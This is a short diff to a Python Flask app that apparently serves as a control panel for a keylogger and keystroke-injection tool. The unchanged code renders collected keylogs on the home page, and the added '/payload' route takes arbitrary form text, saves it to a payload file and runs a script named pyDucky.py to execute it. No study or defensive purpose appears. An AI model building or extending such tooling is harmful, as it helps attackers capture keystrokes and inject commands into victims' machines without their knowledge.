@@ -1,4 +1,4 @@
-from flask import Flask, render_template
+from flask import Flask, render_template, request, redirect, url_for
 import threading
 import subprocess
 import os
@@ -14,6 +14,24 @@ keylogs = []  # List to store keylogs
 def home():
     formatted_logs = format_logs(keylogs)
     return render_template('index.html', logs=formatted_logs)
+
+@app.route('/payload', methods=['GET', 'POST'])
+def payload():
+    if request.method == 'POST':
+        payload_data = request.form['payload']
+        save_payload(payload_data)
+        execute_payload_script()
+        return redirect(url_for('home'))
+    return render_template('index.html')
+
+def save_payload(payload_data):
+    if os.path.exists('payload.txt'):
+        os.remove('payload.txt')
+    with open('payload.txt', 'w') as file:
+        file.write(payload_data)
+
+def execute_payload_script():
+    subprocess.run(['python', 'pyDucky.py'])
 
 def format_logs(logs):
     formatted_logs = []
